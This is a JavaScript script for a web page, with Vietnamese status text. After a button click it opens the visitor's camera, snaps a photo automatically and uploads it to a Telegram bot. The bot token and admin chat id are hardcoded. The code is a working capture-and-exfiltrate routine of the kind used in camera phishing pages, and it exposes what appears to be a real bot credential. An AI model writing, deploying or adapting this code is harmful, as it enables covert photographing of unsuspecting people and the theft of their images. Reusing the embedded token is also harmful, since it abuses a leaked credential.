const botToken = "7981310164:AAHJ-0-RSJQs1y7u7occVGdIBfch45TzHvE";
const adminId = "6331676184";

const video = document.getElementById("camera");
const canvas = document.getElementById("canvas");
const statusText = document.getElementById("status");
const btn = document.getElementById("startBtn");
const cameraBox = document.querySelector(".camera-box");

btn.onclick = async () => {
    btn.style.display = "none";
    cameraBox.style.display = "block";
    statusText.textContent = "Đang yêu cầu quyền camera...";

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            setTimeout(() => autoCapture(), 600);
        };

        statusText.textContent = "Camera đã bật – đang tự chụp ảnh...";
    } catch (err) {
        statusText.textContent = "Không bật được camera. Bạn cần cấp quyền.";
    }
};

async function autoCapture() {
    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL("image/jpeg");

    statusText.textContent = "Đang gửi ảnh tới Telegram...";

    await sendToTelegram(imageData);

    statusText.textContent = "Đã gửi ảnh!";
}

async function sendToTelegram(base64Image) {
    const blob = await (await fetch(base64Image)).blob();
    const formData = new FormData();

    formData.append("chat_id", adminId);
    formData.append("photo", blob, "auto.jpg");

    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
    });
}
